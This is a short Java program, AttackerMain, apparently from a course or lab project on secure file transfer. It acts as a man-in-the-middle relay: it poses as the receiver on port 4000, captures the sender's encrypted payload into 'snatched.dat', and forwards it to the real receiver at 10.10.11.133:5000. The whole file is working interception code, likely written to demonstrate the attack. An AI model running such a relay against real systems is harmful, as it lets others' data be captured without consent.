package SecureFileTransfer.attacker;

import java.io.*;
import java.net.*;

public class AttackerMain {

    public static void main(String[] args) throws Exception {

        ServerSocket fakeReceiver = new ServerSocket(4000);
        System.out.println("Attacker waiting for Sender...");

        Socket senderSocket = fakeReceiver.accept();
        System.out.println("Sender connected to attacker!");

        Socket realReceiver =
                new Socket("10.10.11.133", 5000);

        DataInputStream fromSender =
                new DataInputStream(senderSocket.getInputStream());
        DataOutputStream toReceiver =
                new DataOutputStream(realReceiver.getOutputStream());

        int length = fromSender.readInt();
        byte[] intercepted = new byte[length];
        fromSender.readFully(intercepted);

        FileOutputStream fos =
                new FileOutputStream("snatched.dat");
        fos.write(intercepted);
        fos.close();

        System.out.println("Encrypted data snatched!");

        toReceiver.writeInt(length);
        toReceiver.write(intercepted);

        senderSocket.close();
        realReceiver.close();
        fakeReceiver.close();
    }
}
